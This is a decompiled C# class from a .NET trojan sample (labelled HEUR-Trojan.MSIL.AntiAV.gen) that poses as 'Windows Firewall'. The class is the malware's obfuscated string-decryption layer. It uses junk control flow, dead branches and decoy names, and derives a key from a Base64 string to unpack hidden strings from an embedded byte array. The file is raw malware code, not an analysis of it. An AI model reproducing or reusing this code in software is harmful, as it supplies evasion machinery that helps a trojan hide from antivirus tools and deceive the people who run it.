// Decompiled with JetBrains decompiler
// Type: WindowsFirewall.AspectDesigner
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using System;

namespace WindowsFirewall
{
  internal class AspectDesigner
  {
    internal static readonly byte[] currentColor;

    static AspectDesigner()
    {
      if (AspectDesigner.currentColor != null)
        return;
label_1:
      switch (1)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (AspectDesigner.\u002Ecctor);
          }
          byte[] generatorPosition1 = ClientConverter.SelectToolbox("V2luZG93cyBGaXJld2FsbCQ=");
          string generatorPosition2 = BookmarkContext.SelectToolbox((object) BitmapService.SelectToolbox(), generatorPosition1, 0, generatorPosition1.Length);
          AspectDesigner.currentColor = IconType.SelectToolbox(97L, ClientService.SelectToolbox((object) AspectContext.SelectToolbox(), generatorPosition2));
          break;
      }
    }

    internal static string SelectToolbox(int currentColor)
    {
      int messageHandle;
      if (((int) AspectDesigner.currentColor[currentColor] & 128) == 0)
      {
label_1:
        switch (2)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (AspectDesigner.SelectToolbox);
            }
            messageHandle = (int) AspectDesigner.currentColor[currentColor];
            ++currentColor;
            break;
        }
      }
      else if (((int) AspectDesigner.currentColor[currentColor] & 64) == 0)
      {
label_6:
        switch (7)
        {
          case 0:
            goto label_6;
          default:
            messageHandle = ((int) AspectDesigner.currentColor[currentColor] & -129) << 8 | (int) AspectDesigner.currentColor[currentColor + 1];
            currentColor += 2;
            break;
        }
      }
      else
      {
        messageHandle = ((int) AspectDesigner.currentColor[currentColor] & -193) << 24 | (int) AspectDesigner.currentColor[currentColor + 1] << 16 | (int) AspectDesigner.currentColor[currentColor + 2] << 8 | (int) AspectDesigner.currentColor[currentColor + 3];
        currentColor += 4;
      }
      if (messageHandle >= 1)
        return SelectionContext.SelectToolbox(BookmarkContext.SelectToolbox((object) FunctionCollection.SelectToolbox(), AspectDesigner.currentColor, currentColor, messageHandle));
label_10:
      switch (4)
      {
        case 0:
          goto label_10;
        default:
          return string.Empty;
      }
    }
  }
}
